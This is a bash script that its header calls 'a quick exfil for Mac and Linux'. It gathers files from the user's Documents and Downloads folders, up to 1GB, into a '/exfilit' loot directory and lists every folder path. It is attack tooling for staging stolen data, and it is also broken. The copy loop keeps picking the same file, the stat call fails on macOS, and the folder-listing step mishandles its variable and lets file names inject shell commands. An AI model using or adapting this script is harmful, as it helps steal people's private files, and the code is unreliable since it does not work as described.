#!/bin/bash

# Description: A quick exfil for Mac and Linux.
# Exports files to disk and logs filesystem up to 1GB total size.
# Mod file size as needed.

# Test the ability to copy files.
if ! cp /etc/hosts /dev/null >/dev/null; then
    echo "This script requires permission to copy files." >&2
    exit 1
fi

LOOT_DIR="/exfilit"
SUB_DIR="$LOOT_DIR/files"
SRC_DIRS=("$HOME/Documents" "$HOME/Downloads")
SIZE_LIMIT=1000000000  # 1GB in bytes

# Create the destination directory and its parent directories if they do not exist.
mkdir -p "$SUB_DIR"

# Update the access time of the output files without modifying their contents.
touch -a "$LOOT_DIR"/{large_files,folders}.txt

# Loop through all files in the source directories and copy them to the destination directory,
# up to the size limit.
total_size=0
while [ $total_size -lt $SIZE_LIMIT ]; do
    file=$(find "${SRC_DIRS[@]}" -type f -size +1M -print -quit)
    if [ -z "$file" ]; then
        break
    fi
    size=$(stat -c%s "$file")
    if [ $((total_size + size)) -gt $SIZE_LIMIT ]; then
        break
    fi
    cp "$file" "$SUB_DIR"
    total_size=$((total_size + size))
done

# Append the names of all directories to the folders.txt file.
find "${SRC_DIRS[@]}" -type d -print0 | xargs -0 -I {} sh -c 'echo {} >> "$LOOT_DIR/folders.txt"'
